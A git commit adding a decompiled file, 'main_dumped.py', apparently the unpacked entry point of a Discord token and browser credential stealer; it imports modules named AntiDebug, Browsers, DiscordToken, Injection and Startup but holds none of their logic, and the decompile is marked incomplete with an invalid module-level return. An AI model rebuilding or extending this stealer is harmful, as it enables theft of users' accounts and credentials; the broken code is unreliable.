8e61c7a60d6c81abf1c87ea471608af8c75b72a5
jump_ <53615275+arrayee@users.noreply.github.com>
2023-02-11 21:37:46 +0700

    Add files via upload

---
+++ main_dumped.py
@@ -0,0 +1,23 @@
+# This file is unpacked by zlibdeob (Vault) 
+
+from components.antidebug import AntiDebug
+from components.browsers import Browsers
+from components.discordtoken import DiscordToken
+from components.injection import Injection
+from components.startup import Startup
+from components.systeminfo import SystemInfo
+from config import __CONFIG__
+
+def main():
+    funcs = [
+        AntiDebug,
+        Browsers,
+        DiscordToken,
+        Injection,
+        Startup,
+        SystemInfo]
+# WARNING: Decompyle incomplete
+
+if __name__ == '__main__':
+    main()
+    return None
